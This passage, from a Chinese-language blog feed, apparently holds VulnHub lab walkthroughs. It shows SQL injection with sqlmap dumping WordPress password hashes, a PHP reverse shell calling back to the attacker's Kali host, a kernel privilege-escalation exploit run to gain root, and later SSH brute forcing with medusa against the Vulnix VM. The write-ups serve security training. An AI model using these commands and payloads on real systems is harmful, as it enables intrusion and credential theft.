class="line"><span class="string"> | Author URI: http://www.weirdncrazy.com/universe/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub38.jpg"></p>
<p>点击之后在后面加上单引号，明显有注入</p>
<p>直接上sqlmap,这站太烂了;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1576033944962.req -D wordpress -T wp_users --dump</span><br><span class="line"></span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| ID | user_idmode | user_ip | user_icq | user_msn | user_yim | user_url | user_aim | user_pass                        | user_login   | user_level | user_email              | user_status | user_domain | user_browser | user_nicename | user_nickname | user_lastname | user_firstname | user_registered     | user_description | user_activation_key |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line">| 1  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          | NickJames@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | nickjames     | NickJames     | James         | Nick           | 2010-10-25 20:40:23 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 2  | login       | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          | JohnSmith@hacked        | 0           | &lt;blank&gt;     | &lt;blank&gt;      | johnsmith     | JohnSmith     | Smith         | John           | 2010-10-25 21:25:22 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 3  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         | GeorgeMiller@hacked.com | 0           | &lt;blank&gt;     | &lt;blank&gt;      | georgemiller  | GeorgeMiller  | Miller        | George         | 2011-01-07 03:08:51 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 4  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          | TonyBlack@hacked.com    | 0           | &lt;blank&gt;     | &lt;blank&gt;      | tonyblack     | TonyBlack     | Black         | Tony           | 2011-01-07 03:09:55 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 5  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          | JasonKonnors@hacked.com | 0           | &lt;blank&gt;     | &lt;blank&gt;      | jasonkonnors  | JasonKonnors  | Konnors       | Jason          | 2011-01-07 03:10:36 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">| 6  | nickname    | &lt;blank&gt; | 0        | &lt;blank&gt;  | &lt;blank&gt;  | http://  | &lt;blank&gt;  | 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          | MaxBucky@hacked.com     | 0           | &lt;blank&gt;     | &lt;blank&gt;      | maxbucky      | MaxBucky      | Bucky         | Max            | 2011-01-07 03:11:18 | &lt;blank&gt;          | &lt;blank&gt;             |</span><br><span class="line">+----+-------------+---------+----------+----------+----------+----------+----------+----------------------------------+--------------+------------+-------------------------+-------------+-------------+--------------+---------------+---------------+---------------+----------------+---------------------+------------------+---------------------+</span><br><span class="line"></span><br><span class="line">NickJames   21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">JohnSmith   b986448f0bb9e5e124ca91d3d650f52c</span><br><span class="line">GeorgeMiller  7cbb3252ba6b7e9c422fac5334d22054</span><br><span class="line">TonyBlack   a6e514f9486b83cb53d8d932f9a04292</span><br><span class="line">JasonKonnors 8601f6e1028a8e8a966f6c33fcd9aec4</span><br><span class="line">MaxBucky   50484c19f1afdaf3841a0d821ed393d2</span><br></pre></td></tr></table></figure>

<h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>5个用户爆出账号密码之后，发现GeorgeMiller有管理员权限，使用此账号登录GeorgeMiller/q1w2e3<br>如下图所示改为允许php文件上传</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub39.jpg"></p>
<p>上传文件成功</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub40.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub41.jpg"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>冰蝎中执行命令查看内核版本</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub42.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>为此内核使用漏洞利用建议脚本。 可以在这里下载脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BlbnR1cmFMYWJzL0xpbnV4X0V4cGxvaXRfU3VnZ2VzdGVy">Linux_Exploit_Suggester<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./Linux_Exploit_Suggester.pl -k 2.6.31</span></span><br><span class="line"></span><br><span class="line">Kernel <span class="built_in">local</span>: 2.6.31</span><br><span class="line"></span><br><span class="line">Searching among 65 exploits...</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] american-sign-language</span><br><span class="line">   CVE-2010-4347</span><br><span class="line">   Source: http://www.securityfocus.com/bid/45408/</span><br><span class="line">[+] can_bcm</span><br><span class="line">   CVE-2010-2959</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/14814/</span><br><span class="line">[+] do_pages_move</span><br><span class="line">   Alt: sieve    CVE-2010-0415</span><br><span class="line">   Source: Spenders Enlightenment</span><br><span class="line">[+] half_nelson</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/6851</span><br><span class="line">[+] half_nelson1</span><br><span class="line">   Alt: econet    CVE-2010-3848</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson2</span><br><span class="line">   Alt: econet    CVE-2010-3850</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] half_nelson3</span><br><span class="line">   Alt: econet    CVE-2010-4073</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/17787/</span><br><span class="line">[+] msr</span><br><span class="line">   CVE-2013-0268</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/27297/</span><br><span class="line">[+] pipe.c_32bit</span><br><span class="line">   CVE-2009-3547</span><br><span class="line">   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c</span><br><span class="line">[+] pktcdvd</span><br><span class="line">   CVE-2010-3437</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15150/</span><br><span class="line">[+] ptrace_kmod2</span><br><span class="line">   Alt: ia32syscall,robert_you_suck    CVE-2010-3301</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15023/</span><br><span class="line">[+] rawmodePTY</span><br><span class="line">   CVE-2014-0196</span><br><span class="line">   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c</span><br><span class="line">[+] rds</span><br><span class="line">   CVE-2010-3904</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15285/</span><br><span class="line">[+] reiserfs</span><br><span class="line">   CVE-2010-1146</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/12130/</span><br><span class="line">[+] video4linux</span><br><span class="line">   CVE-2010-3081</span><br><span class="line">   Source: http://www.exploit-db.com/exploits/15024/</span><br></pre></td></tr></table></figure>

<p>一个个慢慢尝试，直到使用了rds这个exploit成功了。<br>[+] rds<br>   CVE-2010-3904<br>   Source: <span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">http://www.exploit-db.com/exploits/15285/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后使用冰蝎的shell将15285.c上传到服务器目录下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub43.jpg"></p>
<p>locate命令查找kali中的php的reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># locate shells</span></span><br><span class="line">/usr/share/webshells/asp</span><br><span class="line">/usr/share/webshells/aspx</span><br><span class="line">/usr/share/webshells/cfm</span><br><span class="line">/usr/share/webshells/jsp</span><br><span class="line">/usr/share/webshells/laudanum</span><br><span class="line">/usr/share/webshells/perl</span><br><span class="line">/usr/share/webshells/php</span><br><span class="line">/usr/share/webshells/asp/cmd-asp-5.1.asp</span><br><span class="line">/usr/share/webshells/asp/cmdasp.asp</span><br><span class="line">/usr/share/webshells/aspx/cmdasp.aspx</span><br><span class="line">/usr/share/webshells/cfm/cfexec.cfm</span><br><span class="line">/usr/share/webshells/jsp/cmdjsp.jsp</span><br><span class="line">/usr/share/webshells/jsp/jsp-reverse.jsp</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/perl/perlcmd.cgi</span><br><span class="line">/usr/share/webshells/php/findsocket</span><br><span class="line">/usr/share/webshells/php/php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">/usr/share/webshells/php/qsd-php-backdoor.php</span><br><span class="line">/usr/share/webshells/php/simple-backdoor.php</span><br><span class="line">/usr/share/webshells/php/findsocket/findsock.c</span><br><span class="line">/usr/share/webshells/php/findsocket/php-findsock-shell.php</span><br></pre></td></tr></table></figure>

<p>其中/usr/share/webshells/php/php-reverse-shell.php即为要使用的shell,leafpad打开此文件修改ip地址和端口号如下图,改成kali攻击机的ip和端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub44.jpg"></p>
<p>然后同样如上方式上传到服务器的目录下,浏览器访问该木马，同时kali攻击机上nc监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.140: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.140] 51935</span><br><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 02:55:19 up  4:02,  0 users,  load average: 4.99, 4.97, 4.91</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-4.0$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">sh-4.0$ id</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">id</span><br><span class="line">sh-4.0$</span><br></pre></td></tr></table></figure>
<p>成功弹回shell  ;););)</p>
<p>gcc编译提权脚本并执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-4.0$ ls</span><br><span class="line">15285.c</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">shell.php</span><br><span class="line">themes</span><br><span class="line">ls</span><br><span class="line">sh-4.0$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">chmod: changing permissions of `plugins<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">chmod: changing permissions of `themes&#x27;</span>: Operation not permitted</span><br><span class="line">sh-4.0$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">sh-4.0$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>提权成功！就是这么屌！！！接下来读取key.txt文件找到密码，挑战完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">Desktop</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">key.txt</span><br><span class="line">key.txt~</span><br><span class="line"></span><br><span class="line">cat key.txt</span><br><span class="line">Yeah!!</span><br><span class="line">You must be proud because you <span class="string">&#x27;ve got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_d&amp;jgQ&gt;&gt;ak\#b&quot;(Hx&quot;o&lt;la_%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string">mr.pr0n || p0wnbox.Team || 2011</span></span><br><span class="line"><span class="string">http://p0wnbox.com</span></span><br></pre></td></tr></table></figure>

<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p>还可以使用如下命令将shell变得看起来更舒服</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不好意思，这次没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HackLAB-Vulnix]</title>
    <url>/2020/04/15/HackLAB-Vulnix/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：HackLAB: Vulnix<br>发布日期：2012年9月10日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Vulnix.7z</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvdnVsbml4L1Z1bG5peC43eg==">http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43eg==">https://download.vulnhub.com/hacklab/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43ei50b3JyZW50">https://download.vulnhub.com/hacklab/Vulnix.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>在这里，有一台易受攻击的Linux主机，它具有配置方面的缺陷，而不是有目的的易受攻击的软件版本（无论如何，在发布之时！）该主机基于Ubuntu Server 12.04，并于2012年9月上旬进行了全面修补。详细信息如下：</p>
<p>架构：x86<br>格式：VMware（vmx＆vmdk）从版本4开始兼容<br>内存：512MB<br>网络：NAT<br>提取大小：820MB<br>压缩（下载大小）：194MB – 7zip格式– 7zip可从此处获得<br>MD5 Vulnix哈希值7z：0bf19d11836f72d22f30bf52cd585757<br>从此处下载Vulnix-</p>
<p>目标;引导，查找IP，破解并获得隐藏在/root中的flag-通过任何想要的方式-不包括对vmdk的实际破解如果有任何问题/意见，请使用下面的评论部分免费联系。</p>
<p>请享用！</p>
<p>资料来源：<span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS8/cD05MzM=">http://www.rebootuser.com/?p=933<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.18</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:6C:D6:66 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.18</span></span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">79/tcp    open  finger     Linux fingerd</span><br><span class="line">110/tcp   open  pop3?</span><br><span class="line">111/tcp   open  rpcbind    2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">143/tcp   open  imap       Dovecot imapd</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>       netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl    2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">39832/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">42471/tcp open  status     1 (RPC <span class="comment">#100024)</span></span><br><span class="line">45506/tcp open  nlockmgr   1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">52840/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">53613/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br></pre></td></tr></table></figure>

<p>如所见，对于某些用户枚举来说，有一些开放的端口可能很有趣：25（smtp），79（finger）和111（rpcbind）。开始做一些手动尝试来获取端口25（smtp）上的用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.66.18 25</span></span><br><span class="line">Trying 192.168.66.18...</span><br><span class="line">Connected to 192.168.66.18.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">ehlo server</span><br><span class="line">250-vulnix</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250 DSN</span><br><span class="line">vrfy root</span><br><span class="line">252 2.0.0 root</span><br><span class="line">vrfy admin</span><br><span class="line">550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy user</span><br><span class="line">252 2.0.0 user</span><br><span class="line">vrfy administrator</span><br><span class="line">550 5.1.1 &lt;administrator&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy vulnix</span><br><span class="line">252 2.0.0 vulnix</span><br></pre></td></tr></table></figure>

<p>在系统上找到3个用户：root，user和vulnix。继续使用finger进行一些研究：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># finger @192.168.66.18</span></span><br><span class="line">No one logged on.</span><br><span class="line">root@kali:~<span class="comment"># finger root@192.168.66.18</span></span><br><span class="line">Login: root                             Name: root</span><br><span class="line">Directory: /root                        Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger user@192.168.66.18</span></span><br><span class="line">Login: user                             Name: user</span><br><span class="line">Directory: /home/user                   Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line"></span><br><span class="line">Login: dovenull                         Name: Dovecot login user</span><br><span class="line">Directory: /nonexistent                 Shell: /bin/<span class="literal">false</span></span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger vulnix@192.168.66.18</span></span><br><span class="line">Login: vulnix                           Name: </span><br><span class="line">Directory: /home/vulnix                 Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure>

<p>有趣的是，该用户用户还具有用于Dovecot的虚拟用户，但没有登录。Dovecot是一个开源电子邮件服务器。这可能是有用的信息。</p>
<p>服务rpcbind已打开。这对于执行一些RPC枚举很有用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.66.18</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    4   tcp    111  portmapper</span><br><span class="line">    100000    3   tcp    111  portmapper</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    4   udp    111  portmapper</span><br><span class="line">    100000    3   udp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  38458  status</span><br><span class="line">    100024    1   tcp  39760  status</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100227    2   tcp   2049</span><br><span class="line">    100227    3   tcp   2049</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100227    2   udp   2049</span><br><span class="line">    100227    3   udp   2049</span><br><span class="line">    100021    1   udp  47060  nlockmgr</span><br><span class="line">    100021    3   udp  47060  nlockmgr</span><br><span class="line">    100021    4   udp  47060  nlockmgr</span><br><span class="line">    100021    1   tcp  50245  nlockmgr</span><br><span class="line">    100021    3   tcp  50245  nlockmgr</span><br><span class="line">    100021    4   tcp  50245  nlockmgr</span><br><span class="line">    100005    1   udp  47351  mountd</span><br><span class="line">    100005    1   tcp  50825  mountd</span><br><span class="line">    100005    2   udp  42195  mountd</span><br><span class="line">    100005    2   tcp  55764  mountd</span><br><span class="line">    100005    3   udp  38349  mountd</span><br><span class="line">    100005    3   tcp  38329  mountd</span><br></pre></td></tr></table></figure>

<p>现在确定NFS正在侦听端口2049/tcp和2049/udp。现在是时候进行一些NFS枚举了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.66.18</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.66.18:</span><br><span class="line">/home/vulnix *</span><br></pre></td></tr></table></figure>

<p>这意味着可以从任何主机访问共享。因此将该共享的位置安装在本地计算机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># mount 192.168.66.18:/home/vulnix /root/vulnhub/vulnix</span></span><br><span class="line">root@kali:~/vulnhub<span class="comment"># cd vulnix</span></span><br><span class="line">bash: <span class="built_in">cd</span>: vulnix: 权限不够</span><br></pre></td></tr></table></figure>

<p>但是当尝试访问该文件夹时，检索到拒绝访问。尝试更改访问权限，但检索到相同的错误。认为root squashing已启用，因为去过由该VM的创建者开办的培训课程，经常提到要使其保持启用状态。</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>至此，决定暴力破解已检索用户的密码。创建一个文件，收集所有用户（没有用户dovenull，没有登录访问权限）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># cat user.txt </span></span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">vulnix</span><br></pre></td></tr></table></figure>

<p>然后使用字典列表rockyou.txt破解密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># medusa -h 192.168.66.18 -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64</span></span><br></pre></td></tr></table></figure>

<p>终于破解了用户user的密码，即letmein。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh user@192.168.66.18</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.18 (192.168.66.18)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.18<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">user@192.168.66.18&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 03:53:37 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB                                                                                                        </span><br><span class="line">                                                                                                                                      </span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">user@vulnix:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) 